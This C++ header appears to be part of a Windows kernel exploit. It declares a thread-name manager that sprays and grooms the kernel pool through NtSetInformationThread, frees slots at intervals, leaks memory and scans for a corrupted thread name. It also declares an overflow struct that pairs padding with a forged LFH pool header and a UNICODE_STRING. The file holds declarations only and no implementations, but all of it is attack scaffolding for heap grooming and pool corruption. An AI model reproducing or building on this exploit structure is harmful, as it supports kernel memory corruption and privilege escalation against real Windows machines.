#pragma once
#include "includes.h"
#include "functions.h"
#include "poolObjects.h"

class ThreadNameManager {
public:
	UINT64 nameSize;
	UINT64 threadCount;
	HANDLE* threads;
	HANDLE leakThread;

	UINT64 leakSize;

	pNtSetInformationThread _NtSetInformationThread;
	pNtQueryInformationThread _NtQueryInformationThread;

	ThreadNameManager();

	bool GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 maxRetries = 5);


	void CreateThreads(UINT64 tNameCount);
	void FreeSlots(UINT64 tStartCount, UINT64 tInterval);
	void CleanExtraThreads();
	BYTE* LeakData();
	HANDLE ScanForCorruptName();
	void ClearThreads();
};



struct ThreadNameOverflow {
	UINT64 padding = 0xcccccccccccccccc;
	UINT64 padding2 = 0xcccccccccccccccc;
	LFH_POOL_HEADER poolHeader;
	UNICODE_STRING threadName;
};